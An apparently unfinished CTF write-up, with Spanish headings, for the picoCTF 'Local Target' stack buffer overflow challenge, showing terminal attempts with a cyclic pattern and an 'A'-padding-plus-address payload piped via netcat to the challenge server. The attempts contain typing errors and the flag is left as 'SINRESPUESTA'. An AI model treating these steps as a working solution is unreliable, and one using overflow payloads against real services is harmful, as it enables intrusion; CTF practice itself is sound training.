# Local Target
## Descripcipción
Smash the stackCan you overflow the buffer and modify the other local variable? The program is available [here](https://artifacts.picoctf.net/c/518/local-target). You can view source [here](https://artifacts.picoctf.net/c/518/local-target.c). And connect with it using:`nc saturn.picoctf.net 63425`
## Pistas
- Do anything you can to change `num`.
- When you change `num`, view the value as hexadecimal.
## Solucion
```
┌──(kali㉿kali)-[~/Documents/binary/local]
└─$ ls -la
total 32
drwxr-xr-x  2 kali kali  4096 May 17 21:08 .
drwxr-xr-x 10 kali kali  4096 May 17 21:07 ..
-rw-r--r--  1 kali kali 17088 May  9 18:19 local-target
-rw-r--r--  1 kali kali   754 May  9 18:19 local-target.c
                                                                           
┌──(kali㉿kali)-[~/Documents/binary/local]
└─$ nc saturn.picoctf.net 63425
Enter a string: sdjhkajshfkjdahfdfajhf ahafklahfd

num is 1801871720
Bye!
                                                                           
┌──(kali㉿kali)-[~/Documents/binary/local]
└─$ nc saturn.picoctf.net 63425
Enter a string: 

num is 64
Bye!
                                                                           
┌──(kali㉿kali)-[~/Documents/binary/local]
└─$ echo'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa' | nc saturn.picoctf.net 56974
                                                                            
┌──(kali㉿kali)-[~/Documents/binary/local]
└─$ 

                                                                            
┌──(kali㉿kali)-[~/Documents/binary/local]
└─$ 
                                                                            
┌──(kali㉿kali)-[~/Documents/binary/local]
└─$ 


                                                                            
┌──(kali㉿kali)-[~/Documents/binary/local]
└─$ echo'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa' | nc saturn.picoctf.net 63425
echoaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa: command not found
Enter a string: echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | nc saturn.picoctf.net 63425

```
## Bandera
picoCTF{SINRESPUESTA}
## Notas adicionales
## Referencias
